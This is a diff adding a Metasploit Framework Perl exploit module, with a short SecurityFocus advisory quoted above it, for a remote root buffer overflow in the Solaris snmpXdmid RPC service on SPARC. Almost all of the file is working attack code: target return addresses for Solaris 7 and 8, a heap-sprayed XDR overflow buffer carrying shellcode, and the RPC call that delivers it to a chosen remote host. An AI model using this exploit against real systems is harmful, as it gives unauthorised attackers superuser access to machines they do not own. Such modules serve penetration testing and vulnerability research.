@@ -1,0 +1,122 @@
+source: http://www.securityfocus.com/bid/2417/info
+ 
+Versions 2.6, 7, and 8 of Sun Microsystem's Solaris operating environment ship with service called 'snmpXdmid'. This daemon is used to map SNMP management requests to DMI requests and vice versa.
+ 
+SnmpXdmid contains a remotely exploitable buffer overflow vulnerability. The overflow occurs when snmpXdmid attempts to translate a 'malicious' DMI request into an SNMP trap.
+ 
+SnmpXdmid runs with root privileges and any attacker to successfully exploit this vulnerability will gain superuser access immediately.
+
+##
+# This file is part of the Metasploit Framework and may be redistributed
+# according to the licenses defined in the Authors field below. In the
+# case of an unknown or missing license, this file defaults to the same
+# license as the core Framework (dual GPLv2 and Artistic). The latest
+# version of the Framework can always be obtained from metasploit.com.
+##
+
+package Msf::Exploit::solaris_snmpxdmid;
+use base "Msf::Exploit";
+use strict;
+use Pex::Text;
+use Pex::SunRPC;
+use Pex::XDR;
+
+my $advanced = { };
+my $info =
+{
+	'Name'  => 'Solaris snmpXdmid AddComponent Overflow',
+	'Version'  => '$Revision: 1.6 $',
+	'Authors' => [ 'vlad902 <vlad902 [at] gmail.com>', ],
+	'Arch'  => [ 'sparc' ],
+	'OS'    => [ 'solaris' ],
+	'Priv'  => 1,
+	'UserOpts'  => {
+		'RHOST' => [1, 'ADDR', 'The target address'],
+		'RPORT' => [1, 'PORT', 'The target RPC port', 111],
+	},
+	'Payload' => {
+		'Space' => 64000,
+		'MinNops' => 63000,
+	},
+	'Description'  => Pex::Text::Freeform(qq{
+	Exploit based on LSD's solsparc_snmpxdmid.c. Exploit a simple overflow and
+	return to the heap avoiding NX stacks.
+	}),
+	'Refs'  =>  [
+		['BID', 2417],
+		['URL', 'http://lsd-pl.net/code/SOLARIS/solsparc_snmpxdmid.c'],
+	],
+	'Targets' => [
+		[ 'Solaris 7 / SPARC', 0xb1868 + 96000, 0xb1868 + 32000 ],
+		[ 'Solaris 8 / SPARC', 0xcf2c0 + 96000, 0xcf2c0 + 32000 ],
+	],
+	'Keys'  => ['snmpxdmid'],
+};
+
+sub new {
+	my $class = shift;
+	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
+	return($self);
+}
+
+sub Exploit {
+	my $self = shift;
+
+	my $target_idx = $self->GetVar('TARGET');
+	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
+
+	my $target = $self->Targets->[$target_idx];
+
+	my %data;
+
+	my $host = $self->GetVar('RHOST');
+	my $port = $self->GetVar('RPORT');
+
+	if(Pex::SunRPC::Clnt_create(\%data, $host, $port, 100249, 1, "tcp", "tcp") == -1)
+	{
+		$self->PrintLine("[*] RPC request failed (snmpXdmid).");
+		return;
+	}
+
+	$self->PrintLine("[*] Using port $data{'rport'}");
+	Pex::SunRPC::Authunix_create(\%data, "localhost", 0, 0, []);
+	$self->PrintLine("[*] Generating buffer...");
+
+	my $array1 =
+		(pack("N", ($target->[2])) x (1248/4)).
+		(pack("N", ($target->[1])) x (352/4)).
+		(pack("N", 0));
+
+	my $array2 =
+		(pack("N", 0) x (64000/4)).
+		($shellcode).
+		(pack("N", 0));
+
+	my @array1_tbl = map { unpack("C", $_) } split(//, $array1);
+	my @array2_tbl = map { unpack("C", $_) } split(//, $array2);
+
+	my $buf =
+		Pex::XDR::Encode_int(0).
+		Pex::XDR::Encode_int(0).
+		Pex::XDR::Encode_bool(1).
+		Pex::XDR::Encode_int(0).
+		Pex::XDR::Encode_bool(1).
+		Pex::XDR::Encode_varray([@array1_tbl], \&Pex::XDR::Encode_lchar).
+		Pex::XDR::Encode_bool(1).
+		Pex::XDR::Encode_varray([@array2_tbl], \&Pex::XDR::Encode_lchar).
+		Pex::XDR::Encode_int(0).
+		Pex::XDR::Encode_int(0);
+
+	$self->PrintLine("[*] Sending payload...");
+
+	if(Pex::SunRPC::Clnt_call(\%data, 0x101, $buf) == -1)
+	{
+		$self->PrintLine("[*] snmpXdmid addcomponent request failed.");
+		return;
+	}
+
+	$self->PrintLine("[*] Sent!");
+
+	return;
+}
+
